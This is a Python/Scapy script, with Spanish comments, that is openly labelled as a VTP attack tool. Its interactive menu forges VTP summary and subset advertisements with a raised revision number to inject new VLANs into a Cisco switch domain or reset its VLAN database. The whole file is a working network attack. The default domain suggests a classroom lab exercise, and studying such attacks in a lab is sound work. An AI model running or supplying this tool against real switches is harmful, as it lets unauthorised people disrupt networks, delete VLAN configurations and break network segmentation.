from scapy.all import *

# --- DEFINICIÓN DE CAPAS VTP (PARA EVITAR NameError) ---
class VTP(Packet):
    name = "VTP"
    fields_desc = [ ByteField("ver", 2),
                    ByteField("type", 1),
                    ByteField("followers", 0),
                    ByteField("dom_len", 4),
                    StrFixedLenField("domain", "itla", 32),
                    IntField("rev", 0),
                    IPField("updater", "20.24.20.100"),
                    StrFixedLenField("timestamp", "", 12),
                    StrFixedLenField("md5", "", 16) ]

class VTPVlanInfo(Packet):
    name = "VTP VLAN Info"
    fields_desc = [ ByteField("len", 12),
                    ByteField("status", 0),
                    ByteField("type", 1),
                    ByteField("name_len", 4),
                    ShortField("vlanid", 1),
                    ShortField("mtu", 1500),
                    IntField("dot1q_index", 0x00010000), # CORREGIDO: No empieza con numero
                    StrLenField("name", "default", length_from=lambda x:x.name_len) ]

# --- FUNCIÓN DE INYECCIÓN ---
def enviar_ataque(rev, v_id, v_name, dom):
    iface = "eth0" # Cambia esto si tu interfaz de Kali es distinta
    print(f"\n[*] Inyectando en dominio '{dom}': VLAN {v_id} ({v_name}) | Revisión: {rev}")
    
    pkt_sum = Dot3(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr(iface)) / \
              LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / \
              SNAP(OUI=0x00000c, code=0x2003) / \
              VTP(ver=2, type=1, domain=dom, rev=int(rev))
    
    pkt_sub = Dot3(dst="01:00:0c:cc:cc:cc", src=get_if_hwaddr(iface)) / \
              LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / \
              SNAP(OUI=0x00000c, code=0x2003) / \
              VTP(ver=2, type=2, rev=int(rev)) / \
              VTPVlanInfo(vlanid=int(v_id), name=v_name, name_len=len(v_name))

    sendp(pkt_sum, iface=iface, verbose=0)
    sendp(pkt_sub, iface=iface, verbose=0)
    print("[+] ¡Paquetes enviados! Revisa el switch.")

# --- MENÚ PRINCIPAL ---
if __name__ == "__main__":
    print("=== HERRAMIENTA DE ATAQUE VTP - DEIVI EDITION ===")
    dominio = input("Introduce el dominio (itla): ") or "itla"
    
    while True:
        print("\n--- MENÚ DE ACCIONES ---")
        print("1. CREAR una VLAN")
        print("2. BORRAR una VLAN (Resetear base de datos)")
        print("3. Salir")
        opc = input("Selecciona (1-3): ")

        if opc == "1":
            v_id = input("ID de la VLAN (ej. 99): ")
            v_name = input("Nombre de la VLAN (ej. HACKED): ")
            rev = input("Nueva revisión (usa 10 si estas en 0): ")
            enviar_ataque(rev, v_id, v_name, dominio)
        elif opc == "2":
            print("[!] Para borrar, mandaremos una revisión mayor con la base de datos limpia.")
            rev = input("Nueva revisión (debe ser mayor a la anterior): ")
            enviar_ataque(rev, 1, "default", dominio)
        elif opc == "3":
            print("Cerrando script...")
            break
        else:
            print("Opción no válida.")